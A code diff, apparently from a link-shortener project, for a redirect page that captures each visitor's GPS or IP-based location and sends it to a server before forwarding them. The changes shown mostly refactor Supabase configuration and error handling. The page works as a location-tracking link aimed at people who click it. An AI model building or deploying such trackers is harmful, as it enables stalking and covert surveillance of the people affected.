@@ -1,11 +1,13 @@
-// pages/r/[id].js - Halaman perantara sebelum redirect
 import { useEffect, useState } from 'react';
 import { createClient } from '@supabase/supabase-js';
 
-const supabase = createClient(
-  process.env.NEXT_PUBLIC_SUPABASE_URL,
-  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
-);
+const supabaseUrl = process.env.Supabase_URL || process.env.NEXT_PUBLIC_SUPABASE_URL;
+const supabaseKey = process.env.Supabase_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
+
+let supabase = null;
+if (supabaseUrl && supabaseKey) {
+  supabase = createClient(supabaseUrl, supabaseKey);
+}
 
 export default function RedirectPage({ linkData, error }) {
   const [status, setStatus] = useState('Mendapatkan lokasi presisi...');
@@ -18,7 +20,6 @@ export default function RedirectPage({ linkData, error }) {
       return;
     }
 
-    // Mulai countdown
     const timer = setInterval(() => {
       setCountdown(prev => {
         if (prev <= 1) {
@@ -29,7 +30,6 @@ export default function RedirectPage({ linkData, error }) {
       });
     }, 1000);
 
-    // Dapatkan GPS
     if (!navigator.geolocation) {
       setStatus('⚠️ Browser tidak support GPS, menggunakan IP geolocation');
       sendLocation(null);
@@ -37,7 +37,6 @@ export default function RedirectPage({ linkData, error }) {
     }
 
     navigator.geolocation.getCurrentPosition(
-      // Success
       async (position) => {
         const { latitude, longitude, accuracy } = position.coords;
         setAccuracy(accuracy);
@@ -49,7 +48,6 @@ export default function RedirectPage({ linkData, error }) {
           accuracy: accuracy
         });
       },
-      // Error
       async (err) => {
         console.warn('Geolocation error:', err.message);
         setStatus('⚠️ Izin lokasi ditolak, menggunakan IP geolocation');
@@ -77,10 +75,9 @@ export default function RedirectPage({ linkData, error }) {
         })
       });
 
-      const result = await response.json();
-      console.log('📍 Lokasi terkirim:', result);
+      await response.json();
+      console.log('📍 Lokasi terkirim');
 
-      // Redirect setelah countdown selesai
       setTimeout(() => {
         window.location.href = linkData.target_url;
       }, 3000);
@@ -177,9 +174,18 @@ export default function RedirectPage({ linkData, error }) {
   );
 }
 
-// Server-side: Ambil data link
 export async function getServerSideProps(context) {
   const { id } = context.params;
+  
+  const supabaseUrl = process.env.Supabase_URL || process.env.NEXT_PUBLIC_SUPABASE_URL;
+  const supabaseKey = process.env.Supabase_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
+  
+  if (!supabaseUrl || !supabaseKey) {
+    console.error('❌ Supabase environment variables not found');
+    return { props: { error: 'Konfigurasi server tidak lengkap', linkData: null } };
+  }
+  
+  const supabase = createClient(supabaseUrl, supabaseKey);
   
   try {
     const { data: linkData, error } = await supabase
@@ -189,7 +195,7 @@ export async function getServerSideProps(context) {
       .single();
 
     if (error || !linkData) {
-      return { props: { error: 'Link tidak ditemukan' } };
+      return { props: { error: 'Link tidak ditemukan', linkData: null } };
     }
 
     return {
@@ -198,10 +204,12 @@ export async function getServerSideProps(context) {
           short_id: linkData.short_id,
           target_url: linkData.target_url,
           user_id: linkData.user_id
-        }
+        },
+        error: null
       }
     };
   } catch (err) {
-    return { props: { error: 'Terjadi kesalahan' } };
+    console.error('Error:', err);
+    return { props: { error: 'Terjadi kesalahan', linkData: null } };
   }
 }
